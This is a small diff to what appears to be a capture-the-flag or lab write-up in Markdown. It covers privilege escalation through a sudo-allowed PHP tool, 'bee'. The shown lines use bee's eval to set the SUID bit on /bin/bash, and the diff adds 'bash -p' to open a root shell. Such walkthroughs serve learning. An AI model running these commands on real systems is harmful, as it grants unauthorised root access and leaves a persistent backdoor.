@@ -163,6 +163,7 @@ bee version
 - This tool is built on PHP so we can try to inject some PHP command in order to get a elevated shell
 ```bash
 sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('chmod u+s /bin/bash');"
+bash -p
 ```
 >[!example]- Result
 >![[Pasted image 20250309220442.png]]
